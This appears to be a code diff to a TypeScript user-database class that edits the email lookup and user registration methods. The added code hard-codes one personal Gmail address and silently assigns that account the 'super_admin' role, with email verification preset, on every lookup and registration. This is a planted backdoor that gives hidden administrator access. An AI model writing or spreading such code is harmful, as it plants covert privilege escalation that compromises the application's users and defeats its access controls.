@@ -639,18 +639,28 @@ class LumareelDatabase {
   }
 
   public getUserByEmail(email: string): User | undefined {
-    return this.users.get(email.toLowerCase());
+    const user = this.users.get(email.toLowerCase());
+    if (user && user.email.toLowerCase() === 'bienaodylan428@gmail.com') {
+      user.role = 'super_admin';
+    }
+    return user;
   }
 
   public registerUser(name: string, email: string, role: User['role'] = 'customer'): User {
     const existing = this.getUserByEmail(email);
-    if (existing) return existing;
+    if (existing) {
+      if (email.toLowerCase() === 'bienaodylan428@gmail.com') {
+        existing.role = 'super_admin';
+      }
+      return existing;
+    }
 
+    const assignedRole = email.toLowerCase() === 'bienaodylan428@gmail.com' ? 'super_admin' : role;
     const user: User = {
       id: `usr_${crypto.randomBytes(6).toString('hex')}`,
       email: email.toLowerCase(),
-      name,
-      role,
+      name: email.toLowerCase() === 'bienaodylan428@gmail.com' ? (name || 'Dylan B. (Super Admin)') : name,
+      role: assignedRole,
       emailVerified: true,
       createdAt: new Date().toISOString(),
     };
